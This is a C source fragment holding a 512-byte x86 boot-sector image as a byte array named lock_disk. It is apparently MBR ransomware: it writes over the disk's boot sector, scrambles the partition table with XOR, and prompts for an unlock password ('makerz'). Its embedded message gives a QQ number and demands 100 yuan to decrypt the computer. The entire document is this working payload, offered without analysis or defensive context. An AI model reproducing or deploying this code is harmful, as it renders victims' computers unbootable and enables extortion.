unsigned char lock_disk[512]={
	0x8C, 0xC8, 0x8E, 0xD8, 0x8E, 0xD0, 0x8E, 0xC0, 0xBC, 0x00, 0x01, 0xBD, 0x21, 0x7D, 0xB9, 0x7C, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xB2, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xB8, 0x05, 0xA0, 0x00, 0x8E, 0xD8, 0x31, 0xC9, 0x31, 0xDB, 0x31, 0xC0, 0xCD, 0x16, 0x3C, 0x08, 0x74, 0x1B, 0x3C, 0x0D, 0x74, 0x26, 0xB4, 0x02, 0x88, 0x07, 0x88, 0x67, 0x01, 0x30, 0xC0, 0x88, 0x47, 0x02, 0x83, 0xC3, 0x02, 0x41, 0x2E, 0x89, 0x0E, 0x20, 0x7D, 0xEB, 0xDD, 0x83, 0xEB, 0x02, 0x49, 0x2E, 0x89, 0x0E, 0x20, 0x7D, 0x31, 0xC0, 0x89, 0x07, 0xEB, 0xCE, 0x8C, 0xC8, 0x8E, 0xC0, 0x31, 0xDB, 0x3E, 0x8A, 0x07, 0x3C, 0x6D, 0x0F, 0x85, 0x93, 0x00, 0x83, 0xC3, 0x02, 0x3E, 0x8A, 0x07, 0x3C, 0x61, 0x0F, 0x85, 0x87, 0x00, 0x83, 0xC3, 0x02, 0x3E, 0x8A, 0x07, 0x3C, 0x6B, 0x75, 0x7D, 0x83, 0xC3, 0x02, 0x3E, 0x8A, 0x07, 0x3C, 0x65, 0x75, 0x73, 0x83, 0xC3, 0x02, 0x3E, 0x8A, 0x07, 0x3C, 0x72, 0x75, 0x69, 0x83, 0xC3, 0x02, 0x3E, 0x8A, 0x07, 0x3C, 0x7A, 0x75, 0x5F, 0x83, 0xC3, 0x02, 0xB1, 0xFF, 0xB5, 0x00, 0x2E, 0x88, 0x2E, 0x1F, 0x7D, 0x3E, 0x8A, 0x07, 0x3C, 0x00, 0x74, 0x0A, 0x2E, 0x30, 0x06, 0x1F, 0x7D, 0x83, 0xC3, 0x02, 0xE2, 0xEF, 0xB8, 0x00, 0x7E, 0x8E, 0xC0, 0x31, 0xDB, 0xB4, 0x02, 0xB2, 0x80, 0xB0, 0x01, 0xB6, 0x00, 0xB5, 0x00, 0xB1, 0x03, 0xCD, 0x13, 0xBB, 0xBD, 0x01, 0x30, 0xED, 0x26, 0x88, 0x2F, 0xBB, 0xBE, 0x01, 0xB1, 0x40, 0x26, 0x8A, 0x07, 0x2E, 0x32, 0x06, 0x1F, 0x7D, 0x26, 0x88, 0x07, 0x43, 0xE2, 0xF2, 0x31, 0xDB, 0xB4, 0x03, 0xB2, 0x80, 0xB0, 0x01, 0xB6, 0x00, 0xB5, 0x00, 0xB1, 0x01, 0xCD, 0x13, 0xEB, 0x1B, 0xBB, 0x80, 0xB8, 0x83, 0xC3, 0x7C, 0xB0, 0x58, 0x88, 0x07, 0x2E, 0x8B, 0x0E, 0x20, 0x7D, 0x31, 0xC0, 0x89, 0x07, 0x83, 0xC3, 0x02, 0xE2, 0xF9, 0xE9, 0xEA, 0xFE, 0xB8, 0xFF, 0xFF, 0x50, 0xB8, 0x00, 0x00, 0x50, 0xCB, 0x00, 0x00, 0x51, 0x51, 0x3A, 0x20, 0x32, 0x32, 0x31, 0x38, 0x37, 0x30, 0x31, 0x38, 0x31, 0x33, 0x0A, 0x0D, 0x43, 0x6F, 0x6E, 0x74, 0x61, 0x63, 0x74, 0x20, 0x75, 0x73, 0x20, 0x61, 0x6E, 0x64, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x70, 0x61, 0x69, 0x64, 0x3A, 0x20, 0x31, 0x30, 0x30, 0x20, 0x59, 0x75, 0x61, 0x6E, 0x2E, 0x0A, 0x0D, 0x57, 0x68, 0x65, 0x6E, 0x20, 0x77, 0x65, 0x20, 0x72, 0x65, 0x63, 0x65, 0x69, 0x76, 0x65, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x70, 0x61, 0x69, 0x64, 0x2C, 0x20, 0x77, 0x65, 0x20, 0x77, 0x69, 0x6C, 0x6C, 0x20, 0x68, 0x65, 0x6C, 0x70, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x64, 0x65, 0x63, 0x72, 0x79, 0x70, 0x74, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65, 0x72, 0x2E, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x55, 0xAA
};